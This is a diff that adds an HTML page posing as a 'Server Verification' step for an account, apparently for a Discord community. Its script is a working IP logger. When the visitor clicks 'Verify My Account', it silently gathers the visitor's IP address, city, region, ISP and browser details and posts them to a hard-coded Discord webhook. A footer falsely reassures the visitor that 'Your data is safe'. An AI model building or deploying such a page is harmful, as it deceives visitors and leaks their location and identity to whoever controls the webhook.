@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Server Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: #e0e0e0;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 { color: #00d2ff; }
+        .box {
+            background: #16213e;
+            padding: 30px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #00d2ff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .verify-btn {
+            background: #00d2ff;
+            color: #1a1a2e;
+            padding: 14px 40px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .verify-btn:hover { background: #00b8e6; transform: scale(1.02); }
+        .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .footer {
+            margin-top: 40px;
+            color: #666;
+            font-size: 12px;
+        }
+        .success { color: #00ff88; }
+        .error { color: #ff4444; }
+    </style>
+</head>
+<body>
+
+    <h1>🔐 Server Verification</h1>
+    <div class="box" id="status">
+        <div class="loader"></div>
+        <p>Click the button below to verify your account.</p>
+    </div>
+
+    <button class="verify-btn" id="verifyBtn">🔐 Verify My Account</button>
+
+    <div class="footer">Secure verification • Your data is safe</div>
+
+    <script>
+        // ====================================================
+        // YOUR WEBHOOK URL — REPLACE IF NEEDED
+        // ====================================================
+        const WEBHOOK = "https://discord.com/api/webhooks/1534665917378592808/lYbv7tTYoITL4UE_TgJTVIppLIzGG1yhwEO3VLV82J-XjIOKVnccG2IZ2uS67uxQXAia";
+        // ====================================================
+
+        let verified = false;
+
+        document.getElementById('verifyBtn').addEventListener('click', async function() {
+            if (verified) return;
+
+            this.textContent = '⏳ Verifying...';
+            this.disabled = true;
+
+            try {
+                // Get IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+
+                // Get location
+                const locRes = await fetch(`https://ipinfo.io/${ip}/json`);
+                const loc = await locRes.json();
+
+                // Build message
+                let message = `**🔐 Verification Completed**\n\n`;
+                message += `🌍 **IP:** ${ip}\n`;
+                message += `📍 **Country:** ${loc.country || 'Unknown'}\n`;
+                message += `🏙️ **City:** ${loc.city || 'Unknown'}\n`;
+                message += `🗺️ **Region:** ${loc.region || 'Unknown'}\n`;
+                message += `📡 **ISP:** ${loc.org || 'Unknown'}\n`;
+                message += `🖥️ **Device:** ${navigator.userAgent}\n`;
+                message += `🕒 **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`;
+
+                // Send to Discord
+                const response = await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                });
+
+                if (response.ok) {
+                    verified = true;
+                    document.getElementById('status').innerHTML = `
+                        <h2 class="success">✅ Verification Complete!</h2>
+                        <p>You are now verified. Redirecting...</p>
+                    `;
+                    this.textContent = '✅ Verified!';
+                    this.style.background = '#22c55e';
+
+                    setTimeout(() => {
+                        window.location.href = 'https://discord.com';
+                    }, 2000);
+                } else {
+                    throw new Error('Webhook failed');
+                }
+
+            } catch (error) {
+                this.textContent = '🔐 Verify My Account';
+                this.disabled = false;
+                document.getElementById('status').innerHTML = `
+                    <h2 class="error">⚠️ Error</h2>
+                    <p>Please try again. If this persists, contact an admin.</p>
+                `;
+            }
+        });
+    </script>
+
+</body>
+</html>
